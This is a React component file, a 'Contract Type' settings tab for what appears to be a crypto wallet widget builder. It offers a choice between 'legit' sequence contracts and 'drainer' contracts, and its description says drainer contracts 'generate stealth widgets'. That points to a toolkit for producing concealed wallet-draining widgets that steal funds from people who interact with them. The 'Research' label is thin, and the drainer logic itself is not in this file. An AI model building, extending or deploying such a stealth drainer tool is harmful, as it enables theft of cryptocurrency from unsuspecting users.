"use client";

import { useStore } from "@/lib/store";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { CONTRACT_REGISTRY, type ContractMeta } from "@/lib/contract-registry";
import { Badge } from "@/components/ui/badge";

export function ContractTab() {
  const { generalConfig, setGeneralConfig } = useStore();

  const selectedId = (generalConfig as any).contractId || "stage1-module";
  const selected = CONTRACT_REGISTRY.find((c) => c.id === selectedId);

  const handleContractChange = (id: string) => {
    setGeneralConfig({
      ...generalConfig,
      contractId: id,
    } as any);
  };

  const drainerContracts = CONTRACT_REGISTRY.filter((c) => c.category === "drainer");
  const sequenceContracts = CONTRACT_REGISTRY.filter((c) => c.category === "sequence");

  return (
    <Card>
      <CardHeader>
        <CardTitle>Contract Type</CardTitle>
        <CardDescription>
          Choose the smart contract the widget will interact with. Drainer contracts generate stealth widgets.
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        <div>
          <Label className="text-xs font-medium">Contract</Label>
          <Select value={selectedId} onValueChange={handleContractChange}>
            <SelectTrigger className="mt-1.5">
              <SelectValue placeholder="Select contract" />
            </SelectTrigger>
            <SelectContent>
              <div className="px-2 py-1.5 text-[10px] text-muted-foreground">Sequence (Legit)</div>
              {sequenceContracts.map((c) => (
                <SelectItem key={c.id} value={c.id}>
                  {c.name}
                </SelectItem>
              ))}

              <div className="px-2 py-1.5 text-[10px] text-muted-foreground mt-2">Drainers (Research)</div>
              {drainerContracts.map((c) => (
                <SelectItem key={c.id} value={c.id}>
                  {c.name}
                </SelectItem>
              ))}

              <div className="px-2 py-1.5 text-[10px] text-muted-foreground mt-2">Custom</div>
              <SelectItem value="custom-abi">Custom ABI (upload)</SelectItem>
            </SelectContent>
          </Select>
        </div>

        {selected && (
          <div className="rounded-lg border bg-accent/30 p-4 text-xs space-y-1">
            <div className="flex items-center gap-2">
              <Badge variant={selected.category === "drainer" ? "destructive" : "secondary"} className="text-[10px]">
                {selected.category.toUpperCase()}
              </Badge>
              <span className="font-mono text-[10px] text-muted-foreground">{selected.address || "No address"}</span>
            </div>
            <p className="text-muted-foreground">{selected.description}</p>
            <p className="text-[10px] text-muted-foreground">Functions: {selected.functions.join(", ")}</p>
          </div>
        )}
      </CardContent>
    </Card>
  );
}
